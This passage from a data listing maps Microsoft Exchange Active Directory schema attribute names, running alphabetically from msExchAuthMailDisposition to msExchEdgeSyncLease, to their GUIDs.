        "msExchAuthMailDisposition" = "57cfb6f7-1e2c-4d3e-96df-40208624baff";
        "msExchAuthoritativePolicyTagGUID" = "db59cfa9-cb68-4d44-864a-105ee832f5c1";
        "msExchAuthoritativePolicyTagNote" = "5fa15d0f-f637-4f97-8a94-ae42f4db1726";
        "msExchAuthorizationPersistence" = "d6ae616b-16c5-44ce-b272-8b923aebe335";
        "msExchAutoDatabaseMountAfter" = "acdc8a22-36bb-424b-a167-7917255a7114";
        "msExchAutoDiscoverAuthPackage" = "26dcf370-365e-482b-806a-48f39fcf90a0";
        "msExchAutoDiscoverCertPrincipalName" = "22e3695c-bb35-4bf2-827a-38fa32636dc1";
        "msExchAutoDiscoverConfig" = "7458633c-1d26-4a9d-a037-bcf12d50a18c";
        "msExchAutoDiscoverDirectoryPort" = "8759dd9f-f2a3-4b14-9bae-fb7a8337ca35";
        "msExchAutoDiscoverFlags" = "2dbb448a-5d85-4144-a9a5-2fc724e194a8";
        "msExchAutoDiscoverPort" = "9e7a164a-bea7-4168-88c0-de28c3d74200";
        "msExchAutoDiscoverReferralPort" = "fd018213-d06f-468f-abb4-eb243c770a84";
        "msExchAutoDiscoverServer" = "015568ac-fe39-44a6-9847-e818115cfc43";
        "msExchAutoDiscoverSPA" = "333dc37a-54bb-4e79-8d31-f9b32df0d4ea";
        "msExchAutoDiscoverTTL" = "9308d33b-9143-4a18-a2bb-381b780921dd";
        "msExchAutoDiscoverVirtualDirectory" = "966540a1-75f7-4d27-ace9-3858b5dea688";
        "msExchAvailabilityAccessMethod" = "169a9e52-79f9-4e41-a6ea-45f5679384cd";
        "msExchAvailabilityAddressSpace" = "2b02d9af-bd14-42d0-8f37-7aa5cd7beef9";
        "msExchAvailabilityConfig" = "e676fec3-dcd0-4565-baea-e25d08698ac1";
        "msExchAvailabilityForeignConnectorDomain" = "3e3ea45b-3573-45be-969d-ff5b5079c969";
        "msExchAvailabilityForeignConnectorType" = "8776d09e-d7ae-44cc-bd4f-abb9cb8dcd22";
        "msExchAvailabilityForeignConnectorVirtualDirectory" = "63c3d4a1-f208-49d1-ad5e-ae733901229a";
        "msExchAvailabilityForestName" = "e1930418-fc4f-4485-84d0-543174cb5dd7";
        "msExchAvailabilityOrgWideAccount" = "480799ea-c8b2-404a-84b4-0fd7363d08d0";
        "msExchAvailabilityOrgWideAccountBL" = "f236b180-6f80-4fbe-b229-2da764637c06";
        "msExchAvailabilityPerUserAccount" = "2bb58427-b5ff-4b63-b671-7c1d0f46b2d7";
        "msExchAvailabilityPerUserAccountBL" = "2f93885a-c019-44f8-b454-78bcab2a7045";
        "msExchAvailabilityUserName" = "02514e6a-1899-4ab5-80ee-910018540be3";
        "msExchAvailabilityUserPassword" = "97c84796-00da-4290-90f7-8fd82eb6645a";
        "msExchAvailabilityUseServiceAccount" = "de48f169-67b7-46e5-9e5f-e5f227d17d73";
        "msExchAvailableServers" = "923b022c-b093-11d2-aa06-00c04f8eedd8";
        "msExchAVAuthenticationService" = "b31c7569-a898-4f13-9098-558ed9eda6ec";
        "msExchBackEndVDirURL" = "b4b283b6-0c3f-4a59-9e50-be9026228231";
        "msExchBackgroundThreads" = "93d051f0-b093-11d2-aa06-00c04f8eedd8";
        "msExchBarMessageClass" = "cf43e549-2ae1-410f-b896-02e40b934373";
        "msExchBaseClass" = "d8782c34-46ca-11d3-aa72-00c04f8eedd8";
        "msExchBasicAuthenticationDomain" = "94262698-b093-11d2-aa06-00c04f8eedd8";
        "msExchBlockedClientVersions" = "2ba9f042-01b5-426d-8071-887b324bf975";
        "msExchBlockedSendersHash" = "66437984-c3c5-498f-b269-987819ef484b";
        "msExchBridgeheadedLocalConnectorsDNBL" = "944c4c38-b093-11d2-aa06-00c04f8eedd8";
        "msExchBridgeheadedRemoteConnectorsDNBL" = "946dad24-b093-11d2-aa06-00c04f8eedd8";
        "msExchBypassAudit" = "816aef3f-62a0-42ba-b5cf-45e18c9df4f0";
        "msExchBypassModerationBL" = "d4f09e9e-a654-4700-b6a3-1995c58dd977";
        "msExchBypassModerationFromDLMembersBL" = "7d2a7fd7-c5f6-4c84-8234-45249d75e1ef";
        "msExchBypassModerationFromDLMembersLink" = "2fd66734-2af0-44c2-9073-591a7082ea07";
        "msExchBypassModerationLink" = "62193e98-6659-4f24-8e47-9bf6d3da2698";
        "msExchCalConClientWait" = "75447978-3752-4256-a89f-b4dfebae9a32";
        "msExchCalConProviders" = "73b41a3e-68b0-45a1-9e30-697b6d19aee6";
        "msExchCalConQueryWindow" = "5ebb881a-19d4-4526-b6f7-cc46d9aa1869";
        "msExchCalConRefreshInterval" = "22bf39b6-7528-412c-b277-aa268db43960";
        "msExchCalConTargetSiteDN" = "33b45526-8e8b-4679-97c3-4eeff39c7fbd";
        "msExchCalculatedTargetAddress" = "9dec1bbb-a410-4aa6-8f72-d480ea3b8970";
        "msExchCalendarConnector" = "922180da-b09e-11d2-aa06-00c04f8eedd8";
        "msExchCalendarLoggingQuota" = "ab3f6345-9ba8-4ecc-99b9-237e57040642";
        "msExchCalendarRepairDisabled" = "459f9bdd-288c-45a7-ab85-68d637fb33b7";
        "msExchCalendarRepairFlags" = "7a8fed44-72e6-487a-a370-0d72c6c75d6d";
        "msExchCalendarRepairIntervalEndWindow" = "5a8ddfdd-afb0-4e9f-becd-85e1661b9aeb";
        "msExchCalendarRepairIntervalStartWindow" = "33b890e7-91b8-4280-8a3b-316370188e2b";
        "msExchCalendarRepairLogFileAgeLimit" = "1086b7ae-38f4-4f28-a53f-009bdaa3c92f";
        "msExchCalendarRepairLogFileSizeLimit" = "72775ae0-98f1-467d-a353-649f0bf2c0f6";
        "msExchCalendarRepairLogPath" = "7047786b-de7e-463c-ac2d-17a867010064";
        "msExchCalendarRepairMaxThreads" = "3e6952eb-fde4-4dcd-b64b-fc086db4a6e8";
        "msExchCapabilityIdentifiers" = "f22218a1-07af-47ee-8a2b-ad0167ad5d14";
        "msExchCASchemaPolicy" = "948f0e10-b093-11d2-aa06-00c04f8eedd8";
        "msExchCatalog" = "94abaa48-b093-11d2-aa06-00c04f8eedd8";
        "msExchccMailADEProp" = "94caa8da-b093-11d2-aa06-00c04f8eedd8";
        "msExchccMailConnectAsPassword" = "b8d47e43-4b78-11d3-aa75-00c04f8eedd8";
        "msExchccMailConnectAsUserid" = "b8d47e3c-4b78-11d3-aa75-00c04f8eedd8";
        "msExchccMailConnector" = "e85710b6-a980-11d2-a9ff-00c04f8eedd8";
        "msExchccMailFilterType" = "950b0858-b093-11d2-aa06-00c04f8eedd8";
        "msExchccMailImportExportVersion" = "952a06ea-b093-11d2-aa06-00c04f8eedd8";
        "msExchccMailKeepForwardHistory" = "9546a322-b093-11d2-aa06-00c04f8eedd8";
        "msExchccMailPassword" = "4634194c-4a93-11d3-aa73-00c04f8eedd8";
        "msExchccMailPOName" = "95633f5a-b093-11d2-aa06-00c04f8eedd8";
        "msExchccMailPOPath" = "98ed3cf2-b093-11d2-aa06-00c04f8eedd8";
        "msExchCertificate" = "98ce3e60-b093-11d2-aa06-00c04f8eedd8";
        "msExchCertificateInformation" = "e8977034-a980-11d2-a9ff-00c04f8eedd8";
        "msExchChatAccess" = "8cac5ed6-b09e-11d2-aa06-00c04f8eedd8";
        "msExchChatAdminMessage" = "98af3fce-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatBan" = "e8d0a8a4-a980-11d2-a9ff-00c04f8eedd8";
        "msExchChatBanMask" = "9890413c-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatBanReason" = "959c77ca-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatBroadcastAddress" = "95b91402-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatChannel" = "e902ba06-a980-11d2-a9ff-00c04f8eedd8";
        "msExchChatChannelAutoCreate" = "95d81294-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatChannelFlags" = "95f4aecc-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatChannelHostKey" = "96114b04-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatChannelJoinMessage" = "962de73c-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatChannelKey" = "964a8374-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatChannelLanguage" = "96671fac-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatChannelLCID" = "9683bbe4-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatChannelLimit" = "96a0581c-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatChannelMode" = "96ba91fa-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatChannelName" = "96d72e32-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatChannelOwnerKey" = "96f3ca6a-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatChannelPartMessage" = "9712c8fc-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatChannelPICS" = "972d02da-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatChannelSubject" = "97499f12-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatChannelTopic" = "97663b4a-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatClassIdentMask" = "9782d782-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatClassIP" = "97a1d614-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatClassRestrictions" = "8090a000-1234-11d3-aa58-00c04f8eedd8";
        "msExchChatClassScopeType" = "8090a006-1234-11d3-aa58-00c04f8eedd8";
        "msExchChatClientPort" = "97be724c-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatDNSReverseMode" = "97db0e84-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatDuration" = "97fa0d16-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatEnableAnonymous" = "98190ba8-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatEnableAuthenticated" = "9835a7e0-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatExtensions" = "3b9d8de5-2d93-11d3-aa6b-00c04f8eedd8";
        "msExchChatInputFloodLimit" = "987142aa-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatMaxAnonymous" = "9969373a-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatMaxConnections" = "9985d372-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatMaxConnectionsPerIP" = "2ac57e6b-f737-4e41-8386-7295ddbe05e6";
        "msExchChatMaxMemberships" = "99a4d204-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatMaxOctetsToMask" = "3de37b23-2789-4df7-b51f-f920ce544458";
        "msExchChatMessageLag" = "99e2cf28-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatMOTD" = "99ff6b60-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatNetwork" = "e934cb68-a980-11d2-a9ff-00c04f8eedd8";
        "msExchChatNetworkMode" = "917cfe98-b09e-11d2-aa06-00c04f8eedd8";
        "msExchChatNetworkName" = "9a1e69f2-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatNickDelay" = "9a3d6884-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatOutputSaturation" = "9a5c6716-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatPingDelay" = "9a7b65a8-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatProtectionLevel" = "9a9a643a-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatProtocol" = "e9621816-a980-11d2-a9ff-00c04f8eedd8";
        "msExchChatServerPort" = "9ab70072-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatStartTime" = "9ad39caa-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatTitle" = "9af29b3c-b093-11d2-aa06-00c04f8eedd8";
        "msExchChatUserClass" = "e9a0153a-a980-11d2-a9ff-00c04f8eedd8";
        "msExchChatVirtualNetwork" = "ea5ed15a-a980-11d2-a9ff-00c04f8eedd8";
        "msExchChildSyncAgreements" = "9b309860-b093-11d2-aa06-00c04f8eedd8";
        "msExchCIAvailable" = "035da50e-1a9e-11d3-aa59-00c04f8eedd8";
        "msExchCILocation" = "cec44725-22ae-11d3-aa62-00c04f8eedd8";
        "msExchCIMDBExclusionList" = "9d146ae3-02ce-4e50-b050-8c3913a7016a";
        "msExchCIRebuildSchedule" = "035da4fd-1a9e-11d3-aa59-00c04f8eedd8";
        "msExchCIRebuildStyle" = "035da507-1a9e-11d3-aa59-00c04f8eedd8";
        "msExchCIUpdateSchedule" = "035da4f8-1a9e-11d3-aa59-00c04f8eedd8";
        "msExchCIUpdateStyle" = "035da502-1a9e-11d3-aa59-00c04f8eedd8";
        "msExchClassFactory" = "2a9e76c5-75e7-49b6-a44c-fee3a2c087db";
        "msExchClientAccessArray" = "f49844ac-d8be-4769-b78d-819321e1610d";
        "msExchClientAccessArrayLegacy" = "d0e851e9-b4e9-4cdb-b51c-d1ed43a836ba";
        "msExchClusterReplicationOrderedPrefixes" = "2d2f066e-01b7-4206-84cf-1c5c3355b752";
        "msExchClusterStorageType" = "f390e0f2-195c-4786-a231-ecc35c4223d0";
        "msExchCmdletExtensionAgent" = "985ff231-3e3c-4e58-84fb-93b6e6385e7c";
        "msExchCmdletExtensionFlags" = "ba626c00-de99-4f03-a5d2-fb5e4a8a76ad";
        "msExchCoexistenceDomains" = "8fead25a-9fb3-4e3a-b11d-b4b4750c52b2";
        "msExchCoexistenceExternalIPAddresses" = "7d21f8f2-7c5e-483e-bd91-9940a497a376";
        "msExchCoexistenceFeatureFlags" = "fb7966d2-abc7-4e76-a9f3-27251699cfa5";
        "msExchCoexistenceOnPremisesSmartHost" = "5fc499bd-b499-479c-802e-96c8c3f38537";
        "msExchCoexistenceRelationship" = "26a50814-02a8-4124-a48b-2d80d885987d";
        "msExchCoexistenceSecureMailCertificateThumbprint" = "97bf111c-5dba-4b4d-99bc-4c37a3370528";
        "msExchCoexistenceServers" = "dafce8a0-7ef7-4393-a0d3-f106d0d5f140";
        "msExchCoexistenceTransportServers" = "2de6e148-9455-4ca7-b19e-8498e34099ae";
        "msExchCoManagedByLink" = "e576cdf7-711f-4395-b995-a6dff0de17ad";
        "msExchCoManagedObjectsBL" = "f15b29a8-636e-4338-82ce-59cd1c7c03d6";
        "msExchCommunityURL" = "a8bb4174-c8ed-4f8b-b906-5fa9da68b40a";
        "msExchCommunityURLEnabled" = "22966a44-ae84-4b1f-99c5-5d801b39b370";
        "msExchComputerLink" = "8a5852f2-b09e-11d2-aa06-00c04f8eedd8";
        "msExchComputerPolicy" = "ed2c752c-a980-11d2-a9ff-00c04f8eedd8";
        "msExchConferenceContainer" = "ed7fe77a-a980-11d2-a9ff-00c04f8eedd8";
        "msExchConferenceMailbox" = "628f0513-88f6-4cef-9de4-b367eb7e8383";
        "msExchConferenceMailboxBL" = "9423ec2c-383b-44b2-8913-ab79ac609bd4";
        "msExchConferenceSite" = "eddce330-a980-11d2-a9ff-00c04f8eedd8";
        "msExchConferenceZone" = "8cfd6eca-b09e-11d2-aa06-00c04f8eedd8";
        "msExchConferenceZoneBL" = "8d1a0b02-b09e-11d2-aa06-00c04f8eedd8";
        "msExchConfigFilter" = "244ef357-7b26-4762-927a-cc1a957da060";
        "msExchConfigRestrictionBL" = "c53e581b-3543-4add-b708-c3ae5d501983";
        "msExchConfigRestrictionLink" = "0df193c4-d178-4380-b860-a4ff5f81f9ae";
        "msExchConfigurationContainer" = "d03d6858-06f4-11d2-aa53-00c04fd7d83a";
        "msExchConfigurationUnitBL" = "0cea1de9-546a-4542-8861-945c121098cf";
        "msExchConfigurationUnitContainer" = "d31a8bb6-32c1-4171-8a25-db5defe47682";
        "msExchConfigurationUnitLink" = "e7f0929c-5c95-4b0a-9aaa-77acd5525b82";
        "msExchConnectionAgreement" = "ee64c93a-a980-11d2-a9ff-00c04f8eedd8";
        "msExchConnector" = "89652316-b09e-11d2-aa06-00c04f8eedd8";
        "msExchConnectors" = "eee325dc-a980-11d2-a9ff-00c04f8eedd8";
        "msExchConnectorType" = "9b8d9416-b093-11d2-aa06-00c04f8eedd8";
        "msExchContainer" = "006c91da-a981-11d2-a9ff-00c04f8eedd8";
        "msExchContentAggregationFlags" = "9aa84e2b-2fbd-4927-8627-ad5426091f20";
        "msExchContentAggregationMaxAcceptedJobsPerProcessor" = "a43c1df3-e42c-4628-92d0-7d9056b4c29d";
        "msExchContentAggregationMaxActiveJobsPerProcessor" = "9f23be9c-0646-46ee-8c8c-6ce17f0e7273";
        "msExchContentAggregationMaxDispatchers" = "a91d7af8-30b6-4337-b63e-cfa1949ecbf2";
        "msExchContentAggregationMaxDownloadItemsPerConnection" = "a1639e68-a7c4-444a-8a35-57501e94447e";
        "msExchContentAggregationMaxDownloadSizePerConnection" = "de26a9c9-d593-4817-b813-b66e6efde165";
        "msExchContentAggregationMaxDownloadSizePerItem" = "9f890633-1cab-4be9-8195-546fca338b16";
        "msExchContentAggregationMaxNumberOfAttempts" = "19e2c1e1-b9d5-4a25-8747-a54f46ce8e49";
        "msExchContentAggregationProxyServerURL" = "bc39ae63-782b-451b-967b-b11cc1e51d4f";
        "msExchContentAggregationRemoteConnectionTimeout" = "99cbfcb7-98aa-4c84-b375-f1eab35b9f5d";
        "msExchContentByteEncoderTypeFor7BitCharsets" = "d131fb5f-15b9-49bd-90f4-b333e8a41f46";
        "msExchContentConfigContainer" = "ab3a1acc-1df5-11d3-aa5e-00c04f8eedd8";
        "msExchContentConversionSettings" = "ce0f654e-2a9f-4483-98c5-b57ae05ef176";
        "msExchContentPreferredInternetCodePageForShiftJis" = "4037f366-ea5a-46ae-93b1-7bda5e6bedd4";
        "msExchContentRequiredCharSetCoverage" = "9d23428e-04a7-4fb4-bed5-2c2cc84c00e3";
        "msExchContinuousReplicationMaxMemoryPerMDB" = "a5b3a364-74f1-4bac-8769-b04e2babc814";
        "msExchControllingZone" = "91462882-b09e-11d2-aa06-00c04f8eedd8";
        "msExchControlPanelFeedbackEnabled" = "06431f01-c418-42c8-935a-03f57c1339e2";
        "msExchControlPanelFeedbackURL" = "2d85b451-d05f-4755-af26-60531d033bd2";
        "msExchControlPanelHelpURL" = "ff033a70-0f25-4a96-84e3-b813542aab11";
        "msExchControlPointConfig" = "86dc8dbb-44b7-42a6-855a-a0ccbd247840";
        "msExchControlPointFlags" = "b4b3de31-5029-44d8-8589-4729ec30b5c7";
        "msExchControlPointTrustedPublishingDomain" = "7e942425-f793-4f86-8f5a-a44da9ad161f";
        "msExchConvertToFixedFont" = "9bac92a8-b093-11d2-aa06-00c04f8eedd8";
        "msExchCopyEDBFile" = "25568433-65f1-463e-89be-951d3184aa57";
        "msExchCorrelationAttribute" = "9c098e5e-b093-11d2-aa06-00c04f8eedd8";
        "msExchCost" = "50c7d2b3-e584-4913-9e1e-8c8ca03c5186";
        "msExchCountries" = "9dc88a93-fe13-4372-a34c-d2262e92e803";
        "msExchCountryList" = "e7810ab0-dd8d-425c-ba7f-9caa7cc5e435";
        "msExchCTP" = "00aa8efe-a981-11d2-a9ff-00c04f8eedd8";
        "msExchCTPClassGUID" = "9c288cf0-b093-11d2-aa06-00c04f8eedd8";
        "msExchCTPFrameHint" = "9c478b82-b093-11d2-aa06-00c04f8eedd8";
        "msExchCTPPropertySchema" = "9c6427ba-b093-11d2-aa06-00c04f8eedd8";
        "msExchCTPProviderGUID" = "9c8588a6-b093-11d2-aa06-00c04f8eedd8";
        "msExchCTPProviderName" = "9ca48738-b093-11d2-aa06-00c04f8eedd8";
        "msExchCTPRequireCMSAuthentication" = "8aa962e6-b09e-11d2-aa06-00c04f8eedd8";
        "msExchCTPSnapinGUID" = "9cc385ca-b093-11d2-aa06-00c04f8eedd8";
        "msExchCU" = "a019e10c-45a3-4b6d-b269-a3bafe70edb7";
        "msExchCurrentServerRoles" = "53436e7c-17d9-40f4-954d-c34d013e9c16";
        "msExchCustomAttributes" = "00e629c8-a981-11d2-a9ff-00c04f8eedd8";
        "msExchCustomerFeedbackEnabled" = "f85ee4bf-7f42-4a97-a08d-41ae0ed965b3";
        "msExchCustomerFeedbackURL" = "6cd94212-89ba-48d7-b68b-8fc8d6a39c41";
        "msExchCustomProxyAddresses" = "e24d7a90-439d-11d3-aa72-00c04f8eedd8";
        "msExchDatabaseBeingRestored" = "372fadff-d0b6-4552-8057-f3a0d2c706a7";
        "msExchDatabaseCreated" = "14f27149-ba76-4aee-bac8-fced38fdff9d";
        "msExchDatabaseSessionAddend" = "9ce2845c-b093-11d2-aa06-00c04f8eedd8";
        "msExchDatabaseSessionIncrement" = "9d0647a2-b093-11d2-aa06-00c04f8eedd8";
        "msExchDatacenterActivationMode" = "e993421c-4cc0-469d-8486-d8a118f4091b";
        "msExchDataLossForAutoDatabaseMount" = "eb17e0a3-6bf3-411f-923d-a8a2041d9cc1";
        "msExchDataMoveReplicationConstraint" = "57476274-eb42-42be-bd79-63a691745e7a";
        "msExchDataPath" = "61c47260-454e-11d3-aa72-00c04f8eedd8";
        "msExchDefaultAdminGroup" = "847584c2-b09e-11d2-aa06-00c04f8eedd8";
        "msExchDefaultDomain" = "9d22e3da-b093-11d2-aa06-00c04f8eedd8";
        "msExchDefaultLoadFile" = "6267667c-cf34-407d-ba11-7cc8cc68ca1b";
        "msExchDefaultLogonDomain" = "8bb46a46-b09e-11d2-aa06-00c04f8eedd8";
        "msExchDefaultPublicMDB" = "65e31d01-02c9-4c2e-bd7b-2da34a28af21";
        "msExchDefaultPublicMDBBL" = "ad1c8d30-f6fd-4ae0-9b97-8ae01661980a";
        "msExchDelegateListBL" = "69edb89a-cd95-404f-ba30-5b8dd73507f6";
        "msExchDelegateListLink" = "279534d8-bf09-447e-bb7b-097fbad043fc";
        "msExchDeletionPeriod" = "3a674751-dddf-475e-b11d-17f3de827b1b";
        "msExchDeliveryAgentConnector" = "5b57eaf0-7aed-426c-8696-506d1604b617";
        "msExchDeliveryOrder" = "9d41e26c-b093-11d2-aa06-00c04f8eedd8";
        "msExchDeltaSyncClientCertificateThumbprint" = "d1ce606b-f1f7-4ad7-92c2-418558929214";
        "msExchDepartment" = "54933f08-f360-45e6-8732-d16e84622af7";
        "msExchDereferenceAliases" = "9d60e0fe-b093-11d2-aa06-00c04f8eedd8";
        "msExchDestBHAddress" = "9d8241ea-b093-11d2-aa06-00c04f8eedd8";
        "msExchDestinationRGDN" = "9d9ede22-b093-11d2-aa06-00c04f8eedd8";
        "msExchDeviceAccessControlRuleBL" = "f6e4801f-dc3e-4e25-8c56-b1d8697fec63";
        "msExchDeviceAccessControlRuleLink" = "6ddfc047-6345-4eb6-bb47-890d796f61da";
        "msExchDeviceAccessRule" = "a0a10355-963d-456f-b797-61607c1cd865";
        "msExchDeviceAccessRuleCharacteristic" = "7405f114-6f98-4cdc-8a0e-369b8051963b";
        "msExchDeviceAccessRuleQueryString" = "4cadae1a-a3b0-4ce5-b3a3-184957e4492f";
        "msExchDeviceAccessState" = "d46f4784-e603-4b12-a561-88e721dc7d1a";
        "msExchDeviceAccessStateReason" = "89d569ba-70a1-4cdd-8ba7-831cd6e1b278";
        "msExchDeviceEASVersion" = "3c53460d-92ac-4063-94f0-f578195d4cad";
        "msExchDeviceFriendlyName" = "a5d32a6f-a9e9-411e-93d3-105c402b7557";
        "msExchDeviceHealth" = "deed6359-6539-4955-aa33-82e1faee7ece";
        "msExchDeviceID" = "4ca67e21-e958-401a-b304-14e0f33d047e";
        "msExchDeviceIMEI" = "a6b8317c-21d2-42e8-88c1-2a46b70d78ec";
        "msExchDeviceMobileOperator" = "9d5adead-0984-4a95-81e3-bfc8f2fa1645";
        "msExchDeviceModel" = "05c93363-f254-4d9f-845c-0dd52e013645";
        "msExchDeviceOS" = "47b66e0d-1288-4c01-a1e7-5a1b8e3a0282";
        "msExchDeviceOSLanguage" = "8893505e-0ca6-4a7c-ae52-48b5a91d9d5f";
        "msExchDeviceTelephoneNumber" = "2ba7113f-2828-4293-a228-6ccceea45c41";
        "msExchDeviceType" = "a15cf6fe-bb03-4acf-bdc7-edcd4a37332f";
        "msExchDeviceUserAgent" = "786bb928-ff91-47a5-a5e5-ac34d9243506";
        "msExchDirBrowseFlags" = "8c221672-b09e-11d2-aa06-00c04f8eedd8";
        "msExchDirsyncFilters" = "9dbddcb4-b093-11d2-aa06-00c04f8eedd8";
        "msExchDirsyncID" = "8810a65e-9495-409c-b864-7505ad9a045a";
        "msExchDirsyncIdSourceAttribute" = "0c15e6a9-6c43-4a36-a8e9-1562b8a2e3e5";
        "msExchDirsyncSchedule" = "8e11ff92-b09e-11d2-aa06-00c04f8eedd8";
        "msExchDirsyncSourceObjectClass" = "8b2b6f29-50ed-4c99-89a0-df43e64fcf55";
        "msExchDirsyncStyle" = "8e2e9bca-b09e-11d2-aa06-00c04f8eedd8";
        "msExchDisabledArchiveDatabaseLink" = "db1224b0-efdb-4b72-a90a-5df837a0a935";
        "msExchDisabledArchiveGUID" = "14d1565d-80fe-4fe4-a447-21ecaec57a3a";
        "msExchDisableUDGConversion" = "372d6cde-38c7-47b6-a3da-be4648124ec0";
        "msExchDiscussionFolder" = "3df30250-38a7-11d3-aa6e-00c04f8eedd8";
        "msExchDistributionGroupDefaultOU" = "0e72ca8a-d199-46a3-b25f-613e816d7d94";
        "msExchDistributionGroupNameBlockedWordsList" = "7f22178b-7ee3-4f8a-8cd2-8a232b15f685";
        "msExchDistributionGroupNamingPolicy" = "7d0d8cee-d209-42df-bd57-51d55caab52f";
        "msExchDistributionListCountQuota" = "8343390a-7790-472b-850d-cce04743e2e9";
        "msExchDistributionListOU" = "c8867b81-3b02-4cfa-a9d6-6eebd697d760";
        "msExchDoFullReplication" = "9e1ad86a-b093-11d2-aa06-00c04f8eedd8";
        "msExchDomainContentConfig" = "ab3a1ad1-1df5-11d3-aa5e-00c04f8eedd8";
        "msExchDomainContentConfigFlags" = "6491cf09-4d5a-465f-a7d9-bb6524fe0698";
        "msExchDomainGlobalGroupGuid" = "0d5aaba3-b593-4256-88dc-a0db2d2ffeec";
        "msExchDomainGlobalGroupSid" = "d059b789-3e9e-4b8f-befe-db62bb580885";
        "msExchDomainLink" = "8ac39cc4-b09e-11d2-aa06-00c04f8eedd8";
        "msExchDomainLocalGroupGuid" = "3bf8ffc0-6492-4af4-b2bf-4f9fdb423425";
        "msExchDomainLocalGroupSid" = "d27eb1e5-a06c-4151-b789-59eabba8edca";
        "msExchDomainRestrictionBL" = "e4cb2ad2-5d69-412d-ba88-7e4d0738192c";
        "msExchDomainRestrictionLink" = "44c0754e-15de-4d58-8c2c-1e8e6164c8a5";
        "msExchDownGradeMultipartSigned" = "9e39d6fc-b093-11d2-aa06-00c04f8eedd8";
        "msExchDS2MBOptions" = "974c99da-33fc-11d3-aa6e-00c04f8eedd8";
        "msExchDSNFlags" = "275dbe59-53b3-401d-88cc-9887ad198faa";
        "msExchDSNMessage" = "cad3f52a-2888-4da9-9bcb-a335fca35c14";
        "msExchDSNSendCopyToAdmin" = "61d591ae-c2e6-4886-9267-1d262bb8c363";
        "msExchDSNText" = "40236c62-0cd2-48e5-a5d6-005b370328ba";
        "msExchDumpsterQuota" = "ac98455b-498d-40cb-ab33-ec63ea9030f2";
        "msExchDumpsterWarningQuota" = "bbb80575-c58e-4c4c-b6b4-cfeebdb0d495";
        "msExchDynamicDistributionList" = "018849b0-a981-11d2-a9ff-00c04f8eedd8";
        "msExchDynamicDLBaseDN" = "763d0ef9-bd92-41f9-ab34-7e329db76ee3";
        "msExchDynamicDLFilter" = "e1b6d32c-6bac-48da-a313-2b58ae1c45ce";
        "msExchEASThrottlingPolicyState" = "bf703dd0-d2c4-4ff7-a260-b83e9522012f";
        "msExchECPVirtualDirectory" = "9880b0a7-2d9b-49cc-8d59-3ca836518632";
        "msExchEDBFile" = "9e58d58e-b093-11d2-aa06-00c04f8eedd8";
        "msExchEDBOffline" = "9e7a367a-b093-11d2-aa06-00c04f8eedd8";
        "msExchEdgeSyncAdamLdapPort" = "5150729b-dfd0-4f84-aa9e-5d1adc335976";
        "msExchEdgeSyncAdamSSLPort" = "bb262b78-4564-43b2-96f1-378828f71a14";
        "msExchEdgeSyncAdvancedConfiguration" = "bf1136aa-d1b4-4a5b-94ef-668307188222";
        "msExchEdgeSyncConfigurationSyncInterval" = "f0017a2e-8f31-4be5-88c9-6925f6ccfe96";
        "msExchEdgeSyncConnector" = "9aa495d2-c938-4fdd-8e22-1acc552d3f6b";
        "msExchEdgeSyncConnectorVersion" = "7b89daf6-9ca8-42ae-8267-89a5bf694809";
        "msExchEdgeSyncCookies" = "1515c22e-60b8-4ca6-9e3c-cdf0e6d53e20";
        "msExchEdgeSyncCookieValidDuration" = "ad12c718-8a19-4f44-ab96-5fe22fa7ba5b";
        "msExchEdgeSyncCredential" = "b71519a3-1465-4b55-bdfb-e144bf7a7682";
        "msExchEdgeSyncEHFBackupLeaseLocation" = "d553bd6d-3ff2-4a01-ade8-59751bc719ca";
        "msExchEdgeSyncEHFConnector" = "f5b6201a-7a35-4522-b9f0-8790b1595478";
        "msExchEdgeSyncEHFFlags" = "4b701b0a-c09e-4123-94ee-4a5ed6362825";
        "msExchEdgeSyncEHFPassword" = "3d812197-bca3-4562-8103-3b2ba14dccaa";
        "msExchEdgeSyncEHFPrimaryLeaseLocation" = "e7c11609-ce7f-4f4e-b1f9-20f2aaa79d0d";
        "msExchEdgeSyncEHFProvisioningURL" = "bb780335-ff6e-4b73-8439-98aca7ebc4ac";
        "msExchEdgeSyncEHFResellerID" = "93e1db20-8bf7-4726-9316-3d82601c4946";
        "msExchEdgeSyncEHFUserName" = "5b364030-5c11-4053-9031-9318cd4cf4fa";
        "msExchEdgeSyncFailoverDCInterval" = "c3a4c8fc-8f65-408b-9864-bb0d674011e6";
        "msExchEdgeSyncLease" = "061d0240-2ac1-46c9-8252-66e52281f892";
